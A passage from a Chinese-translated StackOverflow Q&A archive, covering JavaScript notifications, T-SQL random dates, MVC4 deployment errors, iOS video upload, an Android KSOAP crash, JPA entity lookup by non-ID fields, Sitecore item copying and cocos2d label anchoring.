# StackOverflow 问答 14977000-14977999

# javascript - Noty（通知程序）在函数内部不起作用

> ID：14977001
> 
> 赞同：1
> 
> 时间：2013-02-20T10:00:45.160
> 
> 标签：javascript, jquery, function, notifications

我对 noty 插件[click](http://needim.github.com/noty/)有一个神秘的问题。当我按照网站上的说明创建通知程序时，一切正常，但是当我将相同的语句放入在按钮的“onClick”事件中调用的函数中时，它不起作用。没有通知，没有错误，如果我按下按钮，什么也不会发生。当我删除 noty-thing 并添加正常的“警报”语句时，一切正常。有什么我错过了还是这是一个错误？

原始代码如下所示：

```
<head>
<script type="text/javascript" src="ajax/libs/jquery/1.7/jquery.min.js"></script>
<script type="text/javascript" src="js/noty/jquery.noty.js"></script>
<script type="text/javascript" src="js/noty/layouts/top.js"></script>
<script type="text/javascript" src="js/noty/themes/default.js"></script>
</head>
...
<script>
var noty = noty({text: 'noty - a jquery notification library!'});
</script> 
```

当我将相同的语句放入以下函数时，noty 不再起作用。

```
<head>
<script type="text/javascript" src="ajax/libs/jquery/1.7/jquery.min.js"></script>
<script type="text/javascript" src="js/noty/jquery.noty.js"></script>
<script type="text/javascript" src="js/noty/layouts/top.js"></script>
<script type="text/javascript" src="js/noty/themes/default.js"></script>
</head>
...
<a href="#" onclick="test_function(); return false;" class="btn">klick</a>
...
<script>
function test_function(){
   var noty = noty({text: 'noty - a jquery notification library!'});
}
</script> 
```

即使我将其更改`var noty`为`var n`（或其他），也没有任何变化，如之前的一个 stackoverflow 问题所述。

提前致谢。问候，约翰。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T18:32:09.990

如果你使用这样的东西会更好：

```
<head>
<script type="text/javascript" src="ajax/libs/jquery/1.7/jquery.min.js"></script>
<script type="text/javascript" src="js/noty/jquery.noty.js"></script>
<script type="text/javascript" src="js/noty/layouts/top.js"></script>
<script type="text/javascript" src="js/noty/themes/default.js"></script>
</head>

<script>
$("#element").click(function(){
   var n = noty({text: 'noty - a jquery notification library!'});
});
</script>

<a id="element" href="#" onclick="return false;" class="btn">klick</a> 
```

当然，在您希望绑定到 noty 的元素上使用“id”。它将完美地工作。

在此处查看工作示例： [JSFiddle](http://jsfiddle.net/FPQQp/1/)

# tsql - SQL 查询和更新语句的更改

> ID：14977008
> 
> 赞同：0
> 
> 时间：2013-02-20T10:01:14.870
> 
> 标签：tsql, random

我有一个查询，它会在到达日期字段后 1 到 28 天产生随机出发日期：

```
--Query--

SELECT ArrivalDate, DATEADD(day, 1 + RAND(checksum(NEWID()))
* LengthOfStay.LengthofStay, ArrivalDate) AS DepartureDate    
FROM Bookings, LengthOfStay 
```

但是，当我运行更新查询时，随机时间减少到 1 或 2 天，谁能告诉我这是为什么？

```
--Update Statement--

USE Occupancy
Update B
Set DepartureDate = DATEADD(day, 1 + RAND(checksum(NEWID()))*1.5 * L.LengthofStay, B.ArrivalDate)
FROM LengthOfStay L, Bookings B 
```

谢谢

韦恩

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T10:08:23.493

我使用了以下解决方案：

```
UPDATE BOOKINGS 
SET DepartureDate = 
DATEADD(day, 
CASE WHEN Rand(CHECKSUM(NEWID())) BETWEEN 0 and 0.3 THEN 2 ELSE 
CASE WHEN Rand(CHECKSUM(NEWID())) BETWEEN 0.3 and 0.5 THEN 3 ELSE 
Round(Rand(CHECKSUM(NEWID())) * 28,0) END END,ArrivalDate) 
```

# asp.net-mvc - MVC4-部署“无法加载文件或程序集'DotNetOpenAuth.Core，版本 = 4.0.0.0”？

> ID：14977011
> 
> 赞同：2
> 
> 时间：2013-02-20T10:01:34.277
> 
> 标签：asp.net-mvc, iis, asp.net-mvc-4

我正在尝试在我的本地机器上部署一个简单的 Intranet 应用程序。我已包含可部署程序集并将其部署在 asp.netv4 应用程序池中，但是当我尝试浏览应用程序时出现以下错误。

无法加载文件或程序集“DotNetOpenAuth.Core，Version=4.0.0.0，Culture=neutral，PublicKeyToken=2780ccd10d57b246”或其依赖项之一。该系统找不到指定的文件

有人可以帮忙吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:10:26.303

您应该做的第一件事是转到您的 MVC Web 应用程序项目并展开`References`项目树中的节点。选择程序集，然后`DotNetOpenAuth`在`Properties`对话框中设置并部署它。`Copy Local``True.`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-25T12:32:04.343

```
MVC.NETProject->References->Remove OAuth* 
```

# iphone - 视频从 iphone 应用程序上传到服务器

> ID：14977012
> 
> 赞同：5
> 
> 时间：2013-02-20T10:01:35.320
> 
> 标签：iphone, ios, http, video, file-upload

从我的 iPhone 应用程序，我通过 HTTP 发布将视频上传到服务器。我成功发布了视频，即使我有 3 个问题（我必须解决这个问题）

**1.如果网络中断了一段时间又回来了，如何重新上传？**

**2.如何在一个队列中上传多个文件**

**3.如果用户使用移动网络（3G），会不会有任何问题..目前我只测试WiFi（ipod）**

我在这里添加我的文件发布代码..

```
"UploadClass.h"

@implementation UploadClass

      -(void)uploadVideoToServer:(NSDictionary *)bits file:(NSData *)file {

     appDelegate = (AppDelegate *)[UIApplication sharedApplication].delegate;
    sharedclass = [SharedClass sharedInstance];

    NSString *urlString =@"http://sampleurl.com/upload_video";

    NSMutableURLRequest *request= [[[NSMutableURLRequest alloc] init] autorelease];
    [request setURL:[NSURL URLWithString:urlString]];
    [request setHTTPMethod:@"POST"];

    NSString *boundary = @"---------------------------14737809831466499882746641449";
    NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@",boundary];
    [request addValue:contentType forHTTPHeaderField: @"Content-Type"];
    NSMutableData *postbody = [NSMutableData data];
    [postbody appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n",boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    //userid 
    [postbody appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"user_id\"\r\n\r\n%@", appDelegate.userid] dataUsingEncoding:NSUTF8StringEncoding]];
    [postbody appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n",boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    //video file

    [postbody appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"video\"; filename=\"%@\"\r\n", @"a.mov"] dataUsingEncoding:NSUTF8StringEncoding]];
    [postbody appendData:[[NSString stringWithString:@"Content-Type: application/octet-stream\r\n\r\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [postbody appendData:[NSData dataWithData:file]];

    [postbody appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n",boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    [request setHTTPBody:postbody];

    conn = [[NSURLConnection alloc] initWithRequest:request delegate:self];
    if (conn) {
        webData = [[NSMutableData data] retain];
        }    

     }   
    -(void) connection:(NSURLConnection *) connection didReceiveResponse:(NSURLResponse *) response {
    [webData setLength: 0];
     }

    -(void) connection:(NSURLConnection *) connection didReceiveData:(NSData *) data {
    [webData appendData:data];
    }

     -(void) connection:(NSURLConnection *) connection didFailWithError:(NSError *) error {
    [webData release];
        [conn release];
      }

    //---when the end of element is found---
       -(void)parser:(NSXMLParser *)parser didEndElement:(NSString *)elementName  namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName
    {

    sharedclass = [SharedClass sharedInstance];

    if ([elementName isEqualToString:@"status"])
    {       
        if([postStatus isEqualToString:@"true" ]){
            appDelegate.isVideoUploading=@"NO";
            [[NSNotificationCenter defaultCenter] postNotificationName:@"UPLOADFINISHED"  object:@"true"];
            NSLog(@"upload finished;");
            sharedclass.cameraBtn=YES;

            [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:NO];

        }else{
            appDelegate.isVideoUploading=@"NO";
            [[NSNotificationCenter defaultCenter] postNotificationName:@"UPLOADFINISHED"  object:@"false"];
            //show ui for daily posting failed!!!!!
            //UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Upload Faild" message:@"Please try after sometime !!!"  delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
            //[alert show];
            //[alert release];
            [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:NO];

        }

       }

       } 
```

# android - 当我尝试调用 Web 服务连接方法时应用程序崩溃

> ID：14977013
> 
> 赞同：1
> 
> 时间：2013-02-20T10:01:40.980
> 
> 标签：android, web-services, crash, ksoap

嘿，我遇到了这个问题：在我的 Android 应用程序中有一个使用 KSOAP 调用 Web 服务的方法。不幸的是，每次我尝试执行此特定方法时，整个应用程序都会崩溃。这发生在虚拟设备和真实设备上。

我试过使用本教程：[http ://sarangasl.blogspot.de/2011/10/android-web-service-access-tutorial.html](http://sarangasl.blogspot.de/2011/10/android-web-service-access-tutorial.html)

导入所需的文件，添加 KSOAP，Eclipse 不显示任何错误，将 Internet 使用添加到 Manifest 文件。使用 android:onClick="TestyTest" 在片段的 XML 布局文件中调用该方法

我实际上不知道为什么应用程序崩溃。

```
private final String NAMESPACE = "http://www.webserviceX.NET/";
    private final String URL = "http://www.webservicex.net/ConvertWeight.asmx";
    private final String SOAP_ACTION = "http://www.webserviceX.NET/ConvertWeight";
    private final String METHOD_NAME = "ConvertWeight";

    public void TestyTest(View view)
    {
        TextView text1 = (TextView) findViewById(R.id.update_text);

        SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME); 

        String weight = "3700";
        String fromUnit = "Grams";
        String toUnit = "Kilograms";

        PropertyInfo weightProp =new PropertyInfo();
        weightProp.setName("Weight");
        weightProp.setValue(weight);
        weightProp.setType(double.class);
        request.addProperty(weightProp);

        PropertyInfo fromProp =new PropertyInfo();
        fromProp.setName("FromUnit");
        fromProp.setValue(fromUnit);
        fromProp.setType(String.class);
        request.addProperty(fromProp);

        PropertyInfo toProp =new PropertyInfo();
        toProp.setName("ToUnit");
        toProp.setValue(toUnit);
        toProp.setType(String.class);
        request.addProperty(toProp);

        SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
        envelope.dotNet = true;
        envelope.setOutputSoapObject(request);
        HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);

        try {
            androidHttpTransport.call(SOAP_ACTION, envelope);
            SoapPrimitive response = (SoapPrimitive)envelope.getResponse();
            Log.i("myApp", response.toString());

            text1.setText(weight+" "+fromUnit+" equal "+response.toString()+ " "+toUnit);
//            setContentView(tv);

        } catch (Exception e) {
            e.printStackTrace();
        }

    } 
```

如果这有助于 logcat 文件：

```
02-20 10:58:06.430: E/dalvikvm(3599): Could not find class 'org.ksoap2.serialization.SoapObject', referenced from method com.test.testy.MainActivity.TestyTest
02-20 10:58:06.430: W/dalvikvm(3599): VFY: unable to resolve new-instance 562 (Lorg/ksoap2/serialization/SoapObject;) in Lcom/test/testy/MainActivity;
02-20 10:58:06.430: D/dalvikvm(3599): VFY: replacing opcode 0x22 at 0x0009
02-20 10:58:06.440: D/dalvikvm(3599): DexOpt: unable to opt direct call 0x0dc6 at 0x0f in Lcom/test/testy/MainActivity;.TestyTest
02-20 10:58:06.440: D/dalvikvm(3599): DexOpt: unable to opt direct call 0x0dc2 at 0x1a in Lcom/test/testy/MainActivity;.TestyTest
02-20 10:58:06.440: D/dalvikvm(3599): DexOpt: unable to opt direct call 0x0dc2 at 0x2f in Lcom/test/testy/MainActivity;.TestyTest
02-20 10:58:06.440: D/dalvikvm(3599): DexOpt: unable to opt direct call 0x0dc2 at 0x44 in Lcom/test/testy/MainActivity;.TestyTest
02-20 10:58:06.440: D/dalvikvm(3599): DexOpt: unable to opt direct call 0x0dc9 at 0x5b in Lcom/test/testy/MainActivity;.TestyTest
02-20 10:58:06.440: I/dalvikvm(3599): DexOpt: unable to optimize instance field ref 0x0384 at 0x5f in Lcom/test/testy/MainActivity;.TestyTest
02-20 10:58:06.440: D/dalvikvm(3599): DexOpt: unable to opt direct call 0x0dcc at 0x68 in Lcom/test/testy/MainActivity;.TestyTest
02-20 10:58:06.560: D/libEGL(3599): loaded /system/lib/egl/libEGL_tegra.so
02-20 10:58:06.600: D/libEGL(3599): loaded /system/lib/egl/libGLESv1_CM_tegra.so
02-20 10:58:06.610: D/libEGL(3599): loaded /system/lib/egl/libGLESv2_tegra.so
02-20 10:58:06.640: D/OpenGLRenderer(3599): Enabling debug mode 0
02-20 10:58:06.860: E/SpannableStringBuilder(3599): SPAN_EXCLUSIVE_EXCLUSIVE spans cannot have a zero length
02-20 10:58:06.860: E/SpannableStringBuilder(3599): SPAN_EXCLUSIVE_EXCLUSIVE spans cannot have a zero length
02-20 10:58:06.880: E/SpannableStringBuilder(3599): SPAN_EXCLUSIVE_EXCLUSIVE spans cannot have a zero length
02-20 10:58:06.880: E/SpannableStringBuilder(3599): SPAN_EXCLUSIVE_EXCLUSIVE spans cannot have a zero length
02-20 10:58:06.910: D/dalvikvm(3599): GC_CONCURRENT freed 154K, 5% free 7631K/7972K, paused 2ms+11ms, total 34ms
02-20 10:58:15.530: D/AndroidRuntime(3599): Shutting down VM
02-20 10:58:15.530: W/dalvikvm(3599): threadid=1: thread exiting with uncaught exception (group=0x41274930)
02-20 10:58:15.540: E/AndroidRuntime(3599): FATAL EXCEPTION: main
02-20 10:58:15.540: E/AndroidRuntime(3599): java.lang.IllegalStateException: Could not execute method of the activity
02-20 10:58:15.540: E/AndroidRuntime(3599):     at android.view.View$1.onClick(View.java:3597)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at android.view.View.performClick(View.java:4202)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at android.view.View$PerformClick.run(View.java:17340)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at android.os.Handler.handleCallback(Handler.java:725)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at android.os.Handler.dispatchMessage(Handler.java:92)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at android.os.Looper.loop(Looper.java:137)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at android.app.ActivityThread.main(ActivityThread.java:5039)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at java.lang.reflect.Method.invokeNative(Native Method)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at java.lang.reflect.Method.invoke(Method.java:511)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:560)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at dalvik.system.NativeStart.main(Native Method)
02-20 10:58:15.540: E/AndroidRuntime(3599): Caused by: java.lang.reflect.InvocationTargetException
02-20 10:58:15.540: E/AndroidRuntime(3599):     at java.lang.reflect.Method.invokeNative(Native Method)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at java.lang.reflect.Method.invoke(Method.java:511)
02-20 10:58:15.540: E/AndroidRuntime(3599):     at android.view.View$1.onClick(View.java:3592)
02-20 10:58:15.540: E/AndroidRuntime(3599):     ... 11 more
02-20 10:58:15.540: E/AndroidRuntime(3599): Caused by: java.lang.NoClassDefFoundError: org.ksoap2.serialization.SoapObject
02-20 10:58:15.540: E/AndroidRuntime(3599):     at com.test.testy.MainActivity.TestyTest(MainActivity.java:269)
02-20 10:58:15.540: E/AndroidRuntime(3599):     ... 14 more 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:03:52.943

没有线索？堆栈跟踪告诉您：

```
Caused by: java.lang.NoClassDefFoundError: org.ksoap2.serialization.SoapObject 
```

找到包含该类的 JAR 并将其放入您的 CLASSPATH 中。

`NoClassDefFoundError`具有与 不同的含义`ClassNotFoundException`：

[Android 上 Java 库中代码的 NoClassDefFoundError](https://stackoverflow.com/questions/8678630/noclassdeffounderror-android)

# java - JPA：如何根据 ID 以外的字段值获取实体？

> ID：14977018
> 
> 赞同：79
> 
> 时间：2013-02-20T10:01:56.393
> 
> 标签：java, hibernate, jpa

在 JPA（Hibernate）中，当我们自动生成 ID 字段时，假设用户不知道该键。因此，在获取实体时，用户会根据 ID 以外的某些字段进行查询。在那种情况下我们如何获得实体（因为`em.find()`不能使用）。

我知道我们可以稍后使用查询并过滤结果。但是，有没有更直接的方法（因为据我所知，这是一个非常普遍的问题）。

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2013-02-20T10:09:07.673

正如您所说，这不是一个“问题”。

Hibernate 具有内置的`find()`，但您必须构建自己的查询才能获取特定对象。我推荐使用*Hibernate*的`Criteria`：

```
Criteria criteria = session.createCriteria(YourClass.class);
YourObject yourObject = criteria.add(Restrictions.eq("yourField", yourFieldValue))
                             .uniqueResult(); 
```

这将`criteria`在您当前的类上创建一个，添加列“yourField”等于 value 的限制`yourFieldValue`。`uniqueResult()`告诉它带来独特的结果。如果有更多对象匹配，您应该检索一个列表。

```
List<YourObject> list = criteria.add(Restrictions.eq("yourField", yourFieldValue)).list(); 
```

如果您还有其他问题，请随时提问。希望这可以帮助。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2016-02-03T14:33:01.523

如果您有实体存储库`Foo`并且需要选择具有确切字符串值的所有条目`boo`（也适用于其他原始类型或实体类型）。将其放入您的存储库界面：

```
List<Foo> findByBoo(String boo); 
```

如果您需要订购结果：

```
List<Foo> findByBooOrderById(String boo); 
```

[在参考](https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#repositories.query-methods.details)中查看更多信息。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2016-07-13T04:14:50.147

基本上，您应该添加一个特定的唯一字段。我通常使用`xxxUri`字段。

```
class User {

    @Id
    // automatically generated
    private Long id;

    // globally unique id
    @Column(name = "SCN", nullable = false, unique = true)
    private String scn;
} 
```

你的商业方法会这样做。

```
public User findUserByScn(@NotNull final String scn) {
    CriteriaBuilder builder = manager.getCriteriaBuilder();
    CriteriaQuery<User> criteria = builder.createQuery(User.class);
    Root<User> from = criteria.from(User.class);
    criteria.select(from);
    criteria.where(builder.equal(from.get(User_.scn), scn));
    TypedQuery<User> typed = manager.createQuery(criteria);
    try {
        return typed.getSingleResult();
    } catch (final NoResultException nre) {
        return null;
    }
} 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2017-12-20T20:56:59.373

最佳实践是使用 @NaturalId 注释。它可以用作某些情况下的业务密钥它太复杂了，因此某些字段在现实世界中用作标识符。例如，我有以用户 ID 作为主键的用户类，电子邮件也是唯一字段。所以我们可以使用email作为我们的自然id

```
@Entity
@Table(name="user")
public class User {
  @Id
  @Column(name="id")
  private int id;

  @NaturalId
  @Column(name="email")
  private String email;

  @Column(name="name")
  private String name;
} 
```

要获得我们的记录，只需简单地使用 'session.byNaturalId()'

```
Session session = sessionFactory.getCurrentSession();
User user = session.byNaturalId(User.class)
                   .using("email","huchenhai@qq.com")
                   .load() 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2019-09-12T06:15:10.720

此解决方案来自《Beginning Hibernate》一书：

```
 Query<User> query = session.createQuery("from User u where u.scn=:scn", User.class);
     query.setParameter("scn", scn);
     User user = query.uniqueResult(); 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2013-02-20T10:36:21.630

编写一个这样的自定义方法：

```
public Object findByYourField(Class entityClass, String yourFieldValue)
{
    CriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();
    CriteriaQuery<Object> criteriaQuery = criteriaBuilder.createQuery(entityClass);
    Root<Object> root = criteriaQuery.from(entityClass);
    criteriaQuery.select(root);

    ParameterExpression<String> params = criteriaBuilder.parameter(String.class);
    criteriaQuery.where(criteriaBuilder.equal(root.get("yourField"), params));

    TypedQuery<Object> query = entityManager.createQuery(criteriaQuery);
    query.setParameter(params, yourFieldValue);

    List<Object> queryResult = query.getResultList();

    Object returnObject = null;

    if (CollectionUtils.isNotEmpty(queryResult)) {
        returnObject = queryResult.get(0);
    }

    return returnObject;
} 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2020-09-15T18:08:17.163

我解决了一个类似的问题，我想通过它的 isbnCode 而不是你的 id（主键）找到一本书。

```
@Entity
public class Book implements Serializable {
    private static final long serialVersionUID = 1L;

    @Id
    @GeneratedValue(strategy=GenerationType.IDENTITY)
    private Integer id;
    private String isbnCode;

... 
```

在存储库中，该方法的创建就像提到的@kamalveer singh 一样。请注意，方法名称是 findBy+fieldName（在我的例子中：findByisbnCode）：

```
@Repository
public interface BookRepository extends JpaRepository<Book, Integer> {

    Book findByisbnCode(String isbnCode);
} 
```

然后，在服务中实现该方法：

```
@Service
public class BookService {

    @Autowired
    private BookRepository repo;

    public Book findByIsbnCode(String isbnCode) {
        Book obj = repo.findByisbnCode(isbnCode);
        return obj; 
    }
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2019-12-16T17:51:04.017

All the answers require you to write some sort of SQL/HQL/whatever. Why? You don't have to - just use `CriteriaBuilder`:

**Person.java**:

```
@Entity
class Person  {
  @Id @GeneratedValue
  private int id;

  @Column(name = "name")
  private String name;
  @Column(name = "age")
  private int age;
  ...
} 
```

**Dao.java**:

```
public class Dao  {
  public static Person getPersonByName(String name)  {
        SessionFactory sessionFactory = new Configuration().configure().buildSessionFactory();
        Session session = sessionFactory.openSession();
        session.beginTransaction();

        CriteriaBuilder cb = session.getCriteriaBuilder();

        CriteriaQuery<Person> cr = cb.createQuery(Person.class);
        Root<Person> root = cr.from(Person.class);
        cr.select(root).where(cb.equal(root.get("name"), name));  //here you pass a class field, not a table column (in this example they are called the same)

        Query query = session.createQuery(cr);
        query.setMaxResults(1);
        List<Person> resultList = query.getResultList();

        Person result = resultList.get(0);

        return result;
  }
} 
```

**example of use:**

```
public static void main(String[] args)  {
  Person person = Dao.getPersonByName("John");
  System.out.println(person.getAge());  //John's age
} 
```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2019-09-06T21:25:47.093

编辑：刚刚意识到@Chinmoy 基本上是在做同样的事情，但我想我可能做得更好 ELI5 :)

如果您使用 Spring Data 的风格来帮助从`Repository`您定义的任何类型中持久化/获取内容，您可能可以让您的 JPA 提供程序通过`Repository`接口类中的方法名称的一些巧妙技巧为您执行此操作。请允许我解释一下。

（作为免责声明，我刚才确实/仍在为自己解决这个问题。）

例如，如果我将 Tokens 存储在我的数据库中，我可能有一个如下所示的实体类：

```
@Data // << Project Lombok convenience annotation
@Entity
public class Token {
    @Id
    @Column(name = "TOKEN_ID")
    private String tokenId;

    @Column(name = "TOKEN")
    private String token;

    @Column(name = "EXPIRATION")
    private String expiration;

    @Column(name = "SCOPE")
    private String scope;
} 
```

而且我可能有一个`CrudRepository<K,V>`这样定义的接口，免费为我提供对该存储库的简单 CRUD 操作。

```
@Repository
// CrudRepository<{Entity Type}, {Entity Primary Key Type}>
public interface TokenRepository extends CrudRepository<Token, String> { } 
```

例如，当我查找其中一个令牌时，我的目的可能是检查到期时间或范围。在这两种情况下，我可能都没有`tokenId`方便，而只是`token`我想要查找的字段本身的值。

为此，您可以`TokenRepository`以一种巧妙的方式向您的接口添加一个附加方法，以告诉您的 JPA 提供者您传递给该方法`tokenId`的值不是 ，而是 Entity 类中另一个字段的值，并且它在生成将针对您的数据库运行的实际 SQL 时，应该考虑到这一点。

```
@Repository
// CrudRepository<{Entity Type}, {Entity Primary Key Type}>
public interface TokenRepository extends CrudRepository<Token, String> { 
    List<Token> findByToken(String token);
} 
```

[我在Spring Data R2DBC 文档页面](https://docs.spring.io/spring-data/r2dbc/docs/1.0.0.M1/reference/html/#repositories.query-methods.query-creation)上读到了这一点，到目前为止，它似乎在存储在嵌入式 H2 数据库中的 SpringBoot 2.x 应用程序中工作。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2020-05-01T08:32:14.080

不，您不需要进行条件查询，如果您在 Spring-boot 中工作，您只需做简单的事情即可：在您的 repo 中使用 findBy [exact field name] 声明一个方法名称。示例 - 如果您的模型或文档包含一个字符串字段**myField** 并且您想通过它查找，那么您的方法名称将是：

**findBymyField(String myField);**

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2013-02-20T10:07:54.263

看一下：

*   `JPA query language`: [Java 持久性查询语言](http://docs.oracle.com/javaee/6/tutorial/doc/bnbtg.html)
*   `JPA Criteria API`: [使用 Criteria API 创建查询](http://docs.oracle.com/javaee/6/tutorial/doc/gjitv.html)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2019-02-04T21:29:34.760

在我的 Spring Boot 应用程序中，我解决了类似的问题，如下所示：

```
@Autowired
private EntityManager entityManager;

public User findByEmail(String email) {
    User user = null;
    Query query = entityManager.createQuery("SELECT u FROM User u WHERE u.email=:email");
    query.setParameter("email", email);
    try {
        user = (User) query.getSingleResult();
    } catch (Exception e) {
        // Handle exception
    }
    return user;
} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2016-06-13T08:49:53.750

我写了一个库来帮助做到这一点。它允许通过仅初始化您想要过滤的字段来按对象搜索：[https ://github.com/kg6zvp/GenericEntityEJB](https://github.com/kg6zvp/GenericEntityEJB)

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2019-03-11T04:25:19.843

参考 -[查询方法的 Spring 文档](https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#repositories.query-methods.details)

我们可以通过在方法中传递差异参数来在 Spring Jpa 中添加方法，例如：
`List<Person> findByEmailAddressAndLastname(EmailAddress emailAddress, String lastname);`

```
// Enabling static ORDER BY for a query 

List<Person> findByLastnameOrderByFirstnameAsc(String lastname); 
```

* * *

## 回答 #15

> 赞同：-2
> 
> 时间：2014-03-24T23:03:08.933

使用 CrudRepository 和 JPA 查询对我有用：

```
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.query.Param;

public interface TokenCrudRepository extends CrudRepository<Token, Integer> {

 /**
 * Finds a token by using the user as a search criteria.
 * @param user
 * @return  A token element matching with the given user.
 */
    @Query("SELECT t FROM Token t WHERE LOWER(t.user) = LOWER(:user)")
    public Token find(@Param("user") String user);

} 
```

然后你像这样调用 find 自定义方法：

```
public void destroyCurrentToken(String user){
    AbstractApplicationContext context = getContext();

    repository = context.getBean(TokenCrudRepository.class);

    Token token = ((TokenCrudRepository) repository).find(user);

    int idToken = token.getId();

    repository.delete(idToken);

    context.close();
} 
```

# content-management-system - Sitecore 复制的项目显示错误的内容

> ID：14977021
> 
> 赞同：0
> 
> 时间：2013-02-20T10:02:04.440
> 
> 标签：content-management-system, sitecore

我是 sitecore 的新手，我的任务是为开发人员继续前进的客户创建一些 ppc 登录页面。

他们以前的开发人员过去创建了几个这样的页面，内容非常相似，所以我复制了以前的一个页面并更改了内容。

问题是副本仍然引用原始页面的内容，我知道这就像我更改了原始页面的内容一样，副本也发生了变化。

页面子项是富文本字段和自定义子布局的组合。

我做错了什么还是这是一个错误？任何人都可以建议修复吗？

我想像对数据库中子项的引用之类的东西没有改变原来的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:15:52.273

你是如何复制上一页的？在 Sitecore 中，您应该能够使用 Copy 或 Duplicate 命令，并且能够在不更改原始项目的情况下更改复制的项目（我们的内容编辑器也有这样做的习惯）。

我的猜测是子布局指向特定项目，而不是上下文项目，但如果没有代码或 ascx 片段，这很难说。

# objective-c - 当我使用 CCLabelBMFont 更改字符串值时，字符总是在更改位置

> ID：14977027
> 
> 赞同：2
> 
> 时间：2013-02-20T10:02:45.147
> 
> 标签：objective-c, cocos2d-iphone

我在玩游戏时更新分数标签并使用 显示它`CCLabelBMFont`，当分数改变时，分数标签的每个字符总是改变标签的位置。

我想保持原来的位置！

示例：00:01 占用的空间比 00:50 小；当文本更改`CCLabelBMFont`重新定位文本时。帮帮我，如何保持相同的位置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T09:14:29.427

当您说“总是改变位置”时，您的意思是“左侧不在同一个地方”吗？

`CCNode`类具有`anchorPoint`属性，该属性确定该节点的哪个点“固定”到节点父节点中的点。(0, 0) 的锚点表示左下角，(1, 1) - 右上角，(0.5, 0.5) - 中心。所有定位和转换都围绕锚点进行。

将`anchorPoint`标签的属性设置为当标签的内容大小发生变化时要“固定”的点。例子：

如果您希望左上角静止：

```
label.anchorPoint = ccp(0, 1); 
```

如果您希望左侧的中间静止：

```
label.anchorPoint = ccp(0, 0.5); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T16:15:09.413

您的位图字体是从具有可变宽度的真实类型字体创建的。

只有像 Courier 这样的固定宽度字体才能为字符串中相同数量的字符提供相同的字符串宽度。使用非固定宽度字体绘制的字符串将根据字体中的字符具有不同的宽度，即“w”字符的宽度大于“i”字符的宽度。

打开 FontBook.app（它随每台 Mac 一起提供）并在 Collection 面板中选择“Fixed Width”以仅查看具有固定宽度的字体。在我的系统上，我安装了这些固定宽度的字体：

![在此处输入图像描述](../Images/3d56f0fcb0cdc7e42f34e085974e5cd1.png)

仅供参考，Monaco 是 Xcode 使用的默认字体。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-21T17:14:25.253

这个问题很难说，但我猜你是在谈论标签的实际位置发生变化，这意味着你的对齐方式不是你想要的（例如左对齐而不是右对齐）。

```
Left Justified:
test
testtest

Right Justified:
    test
testtest 
```

如果这就是您所说的，您可以通过更改节点锚点来更改文本对齐方式。

```
// for right justified
label.anchorPoint = ccp(1, 0); 
```

# sql - 使用 sqldataadapter 和 sqltransaction 在多个表中插入记录

> ID：14977030
> 
> 赞同：0
> 
> 时间：2013-02-20T10:02:50.263
> 
> 标签：sql, vb.net

我正在尝试使用 sqldataadapter 和 sqltransaction 一次在多个表中插入记录。我使用以下代码。但它不工作。请帮帮我.......告诉我这段代码中的问题

```
Dim cn As New SqlConnection("Data Source=.\SQLEXPRESS;Initial Catalog=AMHSDB;Integrated Security=True")
